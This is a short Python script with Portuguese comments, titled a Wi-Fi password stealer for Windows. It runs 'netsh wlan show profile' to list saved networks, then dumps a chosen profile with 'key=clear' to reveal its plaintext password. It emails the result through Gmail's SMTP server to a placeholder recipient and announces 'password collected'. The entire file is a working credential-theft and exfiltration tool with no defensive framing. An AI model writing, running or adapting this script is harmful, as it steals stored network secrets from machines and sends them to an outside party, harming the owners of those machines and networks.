import os
import time
import json
import smtplib
import subprocess
from email.message import EmailMessage

print('='*29)
print('Rouba Senhas WI-FI WIN V 1.0')
print('='*29)
os.system('netsh wlan show profile')

print('AGORA INSIRA UM DOS NOMES QUE APARECEM EM PERFIS DE USUÁRIO!')
nomeRede = str(input(': '))

# caso não queira enviar por email: output = os.system(f'netsh wlan show profile {nomeRede} key=clear > output.txt')

output = subprocess.check_output(f'netsh wlan show profile {nomeRede} key=clear')
EMAIL_ADRESS = 'SeuEmail'
EMAIL_PASSWORD = 'SuaSenha'
msg = EmailMessage()
msg['Subject'] = 'OUTPUT'
msg['From'] = 'Enviador(o seu email)'
msg['To'] = 'EmailRecebedor'
msg.set_content(f'{output}')

print(output)
with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp: # Caso seu email não seja gmail mude para o servidor smtp dele.
    smtp.login(EMAIL_ADRESS,EMAIL_PASSWORD)
    smtp.send_message(msg)
print('SENHA COLETADA!')
